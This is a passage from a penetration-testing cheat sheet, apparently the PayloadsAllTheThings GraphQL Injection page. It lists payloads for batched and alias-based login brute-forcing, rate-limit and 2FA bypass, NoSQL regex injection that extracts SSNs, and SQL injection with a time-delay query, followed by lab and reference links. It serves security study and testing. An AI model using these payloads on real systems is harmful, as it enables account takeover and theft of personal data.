<!-- source: GraphQL Injection/README.md | chunk 4/5 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

    id
    name
    email
  }
}
```

**Warning**: Mutations usually won't work with GET. [graphql/graphql-over-http, issue #123](https://github.com/graphql/graphql-over-http/issues/123)

### GraphQL Batching Attacks

Common scenario:

- Password Brute-force Amplification Scenario
- Rate Limit bypass
- 2FA bypassing

#### JSON List Based Batching

> Query batching is a feature of GraphQL that allows multiple queries to be sent to the server in a single HTTP request. Instead of sending each query in a separate request, the client can send an array of queries in a single POST request to the GraphQL server. This reduces the number of HTTP requests and can improve the performance of the application.

Query batching works by defining an array of operations in the request body. Each operation can have its own query, variables, and operation name. The server processes each operation in the array and returns an array of responses, one for each query in the batch.

```json
[
    {
        "query":"..."
    },{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ...
]
```

#### Query Name Based Batching

```json
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```

Send the same mutation several times using aliases

```js
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```

## Injections

> SQL and NoSQL Injections are still possible since GraphQL is just a layer between the client and the database.

### NOSQL Injection

Use `$regex` inside a `search` parameter.

```js
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```

### SQL Injection

Send a single quote `'` inside a GraphQL parameter to trigger the SQL injection

```js
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```

Simple SQL injection inside a GraphQL field.

```powershell
query {
  user(name: "patt';SELECT 1;SELECT pg_sleep(30);--'") {
    id
    email
  }
}
```

## Labs

- [PortSwigger - Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
- [PortSwigger - Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
- [PortSwigger - Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)
- [PortSwigger - Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)
- [PortSwigger - Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
- [Root Me - GraphQL - Introspection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Introspection)
- [Root Me - GraphQL - Injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Injection)
- [Root Me - GraphQL - Backend injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Backend-injection)
- [Root Me - GraphQL - Mutation](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)

## References

- [Building a free open source GraphQL wordlist for penetration testing - Nohé Hinniger-Foray - August 17, 2023](https://web.archive.org/web/20230919211552/https://escape.tech/blog/graphql-security-wordlist/)
- [Exploiting GraphQL - AssetNote - Shubham Shah - August 29, 2021](https://web.archive.org/web/20210830161635/https://blog.assetnote.io/2021/08/29/exploiting-graphql/)
- [GraphQL Batching Attack - Wallarm - December 13, 2019](https://web.archive.org/web/20260223043402/https://lab.wallarm.com/graphql-batching-attack/)
